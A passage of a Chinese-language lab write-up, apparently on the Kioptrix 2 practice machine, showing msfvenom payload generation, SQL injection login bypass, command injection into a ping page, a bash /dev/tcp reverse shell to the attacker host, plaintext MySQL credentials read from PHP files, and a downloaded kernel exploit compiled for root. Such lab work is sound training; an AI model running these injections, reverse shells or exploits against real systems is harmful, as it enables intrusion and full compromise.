+    ^^^^^^^^^
+SyntaxError: Missing parentheses in call to &#39;print&#39;. Did you mean print(...)?
+</code></pre></div></td></tr></table></div>
+<p>把 SyntaxError 的内容 SFTW 一下发现是因为使用了 Python 2 语法，继续：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python2 41233.py
+python script.py &lt;args&gt;
+   -h, --help:             Show this message
+   -a, --rhost:            Target IP address
+   -b, --rport:            Target IPP service port
+   -c, --lib               /path/to/payload.so
+   -f, --stomp-only        Only stomp the ACL (no postex)
+
+Examples:
+python script.py -a 10.10.10.10 -b 631 -f
+python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so
+</code></pre></div></td></tr></table></div>
+<p>发现需要构造 <code>payload.so</code> 并作为参数传入，这和 Kioptix 1 中遇到的开箱即用的脚本不一样</p>
+<p>继续 STFW 发现了 <code>msfvenom</code>，支持生成各种各样的 payload（预装于 Kali）</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code>// 运行 msfvenom -h
+&gt; msfvenom -h
+MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;
+Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe
+
+Options:
+    // 只取了最核心的三个参数，和上面的例子一样
+    // --list 可以具体列出可行的参数
+    -p, --payload         &lt;payload&gt;  Payload to use (--list payloads to list, --list-options for arguments). Specify &#39;-&#39; or STDIN for custom
+    -f, --format          &lt;format&gt;   Output format (use --list formats to list)
+    -o, --out             &lt;path&gt;     Save the payload to a file
+
+// payload 查询
+// 只列出了处于候选名单的 payload（构造反向 shell）
+&gt; msfvenom --list payloads
+
+Framework Payloads (1680 total) [--payload &lt;value&gt;]
+===================================================
+
+    Name                                              Description
+    ----                                              -----------
+    linux/x64/meterpreter/reverse_tcp                 Inject the mettle server payload (staged).
+                                                      Connect back to the attacker
+    linux/x64/shell/reverse_tcp                       Spawn a command shell (staged). Connect back to
+                                                      the attacker
+
+// -f 查询略，选择 elf-so 表示输出 .so 文件
+// 考虑到配置难度，最终选择了 linux/x64/shell/reverse_tcp
+&gt; msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.0.2.3 LPORT=1234 -f elf-so -o payload.so
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf-so file: 532 bytes
+Saved as: payload.so
+</code></pre></div></td></tr></table></div>
+<p>然后运行：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python2 41233.py -a 10.0.2.15 -b 631 -c ./payload.so
+[*]     locate available printer
+[-]     no printers
+</code></pre></div></td></tr></table></div>
+<p>发现没有配置打印机，从 ipp 方向 Getshell 的方向失败</p>
+<h4 id="httpsql">HTTP/SQL 方向</h4>
+<p>访问 <code>http://10.0.2.15/</code>，发现是一个登陆页面 “<strong>Remote System Administration Login</strong>”，需要输入账号和密码</p>
+<p>考虑到使用了 MySQL 服务，尝试 SQL 注入：</p>
+<p><img alt="image-20251019222700649" src="../images/image-20251019222700649.png" /></p>
+<p>注入有效，登录后是一个可以 Ping 操作的页面</p>
+<p><img alt="image-20251019223000171" src="../images/image-20251019223000171.png" /></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code>127.0.0.1
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.283 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.411 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.508 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 0.283/0.400/0.508/0.095 ms, pipe 2
+</code></pre></div></td></tr></table></div>
+<p>发现 Web Console 直接执行了一个 <code>ping 127.0.0.1</code> 的操作，尝试一个命令注入</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; 127.0.0.1 | whoami
+apache
+</code></pre></div></td></tr></table></div>
+<p>非常听话，此时可以理解为获得了一个低权限 Shell，接下来考虑提权</p>
+<p>为了方便操作我们先获取一个反向 Shell：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>// Web 页面，命令注入
+&gt; 127.0.0.1|bash -i &gt;&amp; /dev/tcp/10.0.2.3/1234 0&gt;&amp;1
+// 攻击机 Shell，nc 连接反向 Shell
+&gt; nc -lvp 1234  
+listening on [any] 1234 ...
+10.0.2.15: inverse host lookup failed: Unknown host
+connect to [10.0.2.3] from (UNKNOWN) [10.0.2.15] 32771
+bash: no job control in this shell
+bash-3.00$ 
+</code></pre></div></td></tr></table></div>
+<p>Getshll 操作完成</p>
+<h3 id="_4">提权尝试</h3>
+<h4 id="sql-udf">SQL UDF 提权（提权失败）</h4>
+<p>MySQL 服务通常以高权限运行，可以先获得 MySQL 的管理员账户，再通过 UDP 执行系统指令</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span></pre></div></td><td class="code"><div><pre><span></span><code>/* /var/www/html/index.php 存放 Apache 的文档根目录（默认）*/
+&gt; bash-3.00$ cat /var/www/html/index.php
+&lt;?php
+        // 这里是 MySQL 凭据，明文存储
+        mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());
+        //print &quot;Connected to MySQL&lt;br /&gt;&quot;;
+        mysql_select_db(&quot;webapp&quot;);
+
+        if ($_POST[&#39;uname&#39;] != &quot;&quot;){
+                $username = $_POST[&#39;uname&#39;];
+                $password = $_POST[&#39;psw&#39;];
+                // SQL 注入漏洞
+                $query = &quot;SELECT * FROM users WHERE username = &#39;$username&#39; AND password=&#39;$password&#39;&quot;;
+                //print $query.&quot;&lt;br&gt;&quot;;
+                $result = mysql_query($query);
+
+                $row = mysql_fetch_array($result);
+                //print &quot;ID: &quot;.$row[&#39;id&#39;].&quot;&lt;br /&gt;&quot;;
+        }
+
+?&gt;
+
+/* ping 命令注入时的 php 页面 */
+&gt; bash-3.00$ cat /var/www/html/pingit.php
+&lt;?php
+
+print $_POST[&#39;ip&#39;];
+if (isset($_POST[&#39;submit&#39;])){
+        $target = $_REQUEST[ &#39;ip&#39; ];
+        echo &#39;&lt;pre&gt;&#39;;
+        echo shell_exec( &#39;ping -c 3 &#39; . $target );
+        echo &#39;&lt;/pre&gt;&#39;;
+    }
+?&gt;
+</code></pre></div></td></tr></table></div>
+<p>尝试修改 <code>pingit.php</code> 提权发现没有权限，根据 <code>index.php</code> 的明文账号密码登录 MySQL</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code>bash-3.00$ mysql -u john -p
+Enter password: hiroshima
+// 进入 MySQL
+// 反向 Shell 下指令输入似乎有问题，缓冲区内容不会立即输出
+SELECT @@version;
+@@version
+4.1.22
+
+SELECT @@plugin_dir;
+ERROR 1193 (HY000) at line 2: Unknown system variable &#39;plugin_dir&#39;
+
+system chmod +s /bin/bash
+chmod: changing permissions of `/bin/bash&#39;: Operation not permitted
+
+select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1)\G;
+*************************** 1. row ***************************
+                 Host: localhost
+                 User: john
+             Password: 5a6914ba69e02807
+          Select_priv: Y
+          Insert_priv: Y
+          Update_priv: Y
+          Delete_priv: Y
+          Create_priv: N
+            Drop_priv: N
+          Reload_priv: N
+        Shutdown_priv: N
+         Process_priv: N
+            File_priv: N        // 没有写入文件的权限
+           Grant_priv: N
+      References_priv: N
+           Index_priv: N
+           Alter_priv: N
+         Show_db_priv: N
+           Super_priv: N        // 不是管理员
+Create_tmp_table_priv: N
+     Lock_tables_priv: N
+         Execute_priv: N
+      Repl_slave_priv: N
+     Repl_client_priv: N
+             ssl_type: 
+           ssl_cipher: 
+          x509_issuer: 
+         x509_subject: 
+        max_questions: 0
+          max_updates: 0
+      max_connections: 0
+</code></pre></div></td></tr></table></div>
+<p>目前的普通账号高度受限，遂放弃 SQL 方向</p>
+<h4 id="kernal">Kernal 内核漏洞</h4>
+<p>之前有确定操作系统为 CentOS，先进一步获取系统版本，然后上传一份对应版本的漏洞脚本</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code>/* 靶机反向 Shell */
+bash-3.00$ cat /etc/lsb-release.d
+CentOS release 4.5 (Final)
+// 收集信息：靶机为 CentOS 4.5
+
+/* 攻击机 Shell */
+&gt; searchsploit centos 4.5
+--------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                       |  Path
+--------------------------------------------------------------------- ---------------------------------
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox | linux/local/9479.c
+Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Cor | linux_x86/local/9542.c
+Linux Kernel 3.14.5 (CentOS 7 / RHEL) - &#39;libfutex&#39; Local Privilege E | linux/local/35370.c
+--------------------------------------------------------------------- ---------------------------------
+&gt; searchsploit -m 9542
+  Exploit: Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - &#39;ip_append_data()&#39; Ring0 Privilege Escalation (1)
+      URL: https://www.exploit-db.com/exploits/9542
+     Path: /usr/share/exploitdb/exploits/linux_x86/local/9542.c
+    Codes: CVE-2009-2698
+ Verified: True
+File Type: C source, ASCII text
+Copied to: /home/kali/9542.c
+
+&gt; python3 -m http.server 1145
+Serving HTTP on 0.0.0.0 port 1145 (http://0.0.0.0:1145/) ...
+// 攻击机使用 http 上传 9542.c
+
+/* 靶机接收文件，编译运行 */
+bash-3.00$ cd /tmp
+bash-3.00$ wget 10.0.2.3:1145/9542.c
+--15:22:52--  http://10.0.2.3:1145/9542.c
+           =&gt; `9542.c&#39;
+Connecting to 10.0.2.3:1145... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,535 (2.5K) [text/x-csrc]
+
+    0K ..                                                    100%  109.89 MB/s
+
+15:22:52 (109.89 MB/s) - `9542.c&#39; saved [2535/2535]
+
+bash-3.00$ gcc 9542.c -o exploit
+9542.c:109:28: warning: no newline at end of file
+bash-3.00$ ./exploit
+sh: no job control in this shell
+sh-3.00# whoami
+root
+// 获得了 root 权限，使用 passwd 修改密码
+</code></pre></div></td></tr></table></div>
+<hr />
+<h3 id="_5">渗透结果</h3>
+<p>成功获取了 root 权限并且修改了 root 密码，登录靶机界面，输入新密码进入 root 账号：</p>
+<p><img alt="image-20251020064850024" src="../images/image-20251020064850024.png" /></p>
+<hr />
+<h3 id="_6">问题分析/启示</h3>
+<ol>
+<li>ipp 服务有对应的 exploit，但是在各个阶段都尝试失败</li>
+</ol>
+<p>经过测试，ipp 服务对应的 Getshell 脚本和本地提权脚本都因为没有启用打印机服务而尝试失败，通过其他方法获得低权限 Shell 后也没有权限设置虚拟打印机。并且 nmap 扫描时已经出现了 403 Forbidden 状态码，暗示应该尽早转移方向，避免浪费时间</p>
+<ol>
+<li>Getshell 后可以优先尝试进行内核攻击，因为靶机的各个服务都很古老，考虑靶机系统内核有成熟漏洞利用，尝试失败后再考虑 SUID，SQL UDF 等方向的提权</li>
+</ol>
+<hr />
+<h3 id="_7">其他</h3>
+<p>​   总用时 4h，查资料 + 试错用时 2.5h</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../stylesheets/extra.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
